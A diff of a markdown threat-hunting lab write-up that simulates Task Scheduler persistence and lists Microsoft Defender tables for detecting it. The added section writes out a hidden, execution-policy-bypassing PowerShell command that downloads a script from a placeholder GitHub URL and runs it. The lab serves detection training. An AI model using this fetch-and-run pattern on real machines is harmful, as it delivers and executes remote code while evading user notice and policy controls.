@@ -1,26 +1,31 @@
 # Threat Event (Living Off The Land)
 ** Task Scheduler Persistence(Living off the Land)**
 
-## Steps the "Bad Actor" took Create Logs and IoCs:
+## Steps The "Bad Actor" Took Create Logs and IoCs:
 1. Gained intial access(simulated) and downloaded malicious file called `themachine.html`
 2. Once the download is complete, the file then executes a `PowerShell` script
 3. Persistence is kept with an initial PowerShell script to create a task in `Task Scheduler` at logon 
 4. Execution is triggered two minutes after logon and opens notepad with a message `Hello my son Welcome to the machine`
+
 ---
 
-## Tables Used to Detect IoCs:
+## Command Used To Download and Execute script:
+`cmd.exe /c powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/USERNAME/RESPOSITORY/FILE' -OutFile 'C:\YOUR\FILE\PATH\themachine.html.ps1'; & 'C:\YOUR\FILE\PATH\themachine.html.ps1'"`
+
+---
+
+## Tables used to detect IoCs:
 | **Parameter**       | **Description**                                                              |
 |---------------------|------------------------------------------------------------------------------|
 | **Name**| DeviceFileEvents|
 | **Info**|https://learn.microsoft.com/en-us/defender-xdr/advanced-hunting-deviceinfo-table|
-| **Purpose**| Used for detecting TOR download and installation, as well as the shopping list creation and deletion. |
+| **Purpose**| Used for detecting `themachine.html` download as well as the creation of the task to run after logon. |
 
 | **Parameter**       | **Description**                                                              |
 |---------------------|------------------------------------------------------------------------------|
 | **Name**| DeviceProcessEvents|
 | **Info**|https://learn.microsoft.com/en-us/defender-xdr/advanced-hunting-deviceinfo-table|
-| **Purpose**| Used to detect the command line and PowerShell service launching.|
-
+| **Purpose**| Used to detect the command line and PowerShell services executing payload.|
 
 ---
 
@@ -68,7 +73,7 @@ DeviceProcessEvents
 ## Created By:
 - **Author Name**: Larry Harris Jr
 - **Author Contact**: https://www.linkedin.com/in/larryharrisjr/
-- **Date**: November 9, 2024
+- **Date**: April 4, 2025
 
 ## Validated By:
 - **Reviewer Name**: 
@@ -85,4 +90,4 @@ DeviceProcessEvents
 ## Revision History:
 | **Version** | **Changes**                   | **Date**         | **Modified By**   |
 |-------------|-------------------------------|------------------|-------------------|
-| 1.0         | Initial draft                  | `November 9, 2024`  | `Larry Harris Jr`   
+| 1.0         | Initial draft                  | `April 4, 2025`  | `Larry Harris Jr`   
